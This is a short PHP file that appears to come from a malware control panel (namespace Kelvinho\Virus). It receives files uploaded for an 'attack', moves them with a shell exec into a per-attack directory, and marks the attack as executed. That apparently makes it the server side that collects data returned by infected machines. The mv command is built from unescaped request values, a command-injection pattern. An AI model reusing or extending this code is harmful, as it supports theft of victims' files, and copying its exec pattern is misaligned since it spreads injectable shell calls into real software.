<?php

use Kelvinho\Virus\Logs;

for ($i = 0; $i < count($this->fileNames); $i++) if (!isset($_FILES["file$i"])) Logs::error("Supposed to have file $i");
for ($i = 0; $i < count($this->fileNames); $i++) exec("mv \"" . $_FILES["file$i"]["tmp_name"] . "\" \"" . DATA_FILE . "/attacks/<?php echo $this->attack_id; ?>/file$i\"");
$this->setExecuted();
$this->saveState();